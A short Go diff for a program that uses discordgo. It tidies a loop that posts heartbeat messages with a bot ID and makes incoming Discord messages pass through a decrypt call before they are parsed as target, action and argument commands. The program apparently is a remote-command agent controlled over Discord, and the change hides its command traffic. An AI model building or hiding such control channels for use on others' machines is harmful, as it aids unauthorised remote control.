@@ -47,7 +47,7 @@ func main() {
 
 	// Heartbeat notification every 15 seconds
 	go func(s *discordgo.Session) {
-		for _ = range time.Tick(discord.Timeout * time.Second) {
+		for range time.Tick(discord.Timeout * time.Second) {
 			discord.SendMessage(s, fmt.Sprintf("%s\n%q\n%q", botID, "Connected", "None"))
 		}
 	}(dg)
@@ -73,7 +73,8 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	var target string
 	var action string
 	var arg string
-	n, err := fmt.Sscanf(m.Content, "%s\n%s\n%q", &target, &action, &arg)
+	decryptedContent := discord.Decrypt(m.Content)
+	n, err := fmt.Sscanf(decryptedContent, "%s\n%s\n%q", &target, &action, &arg)
 	if err != nil || n != 3 {
 		return
 	}
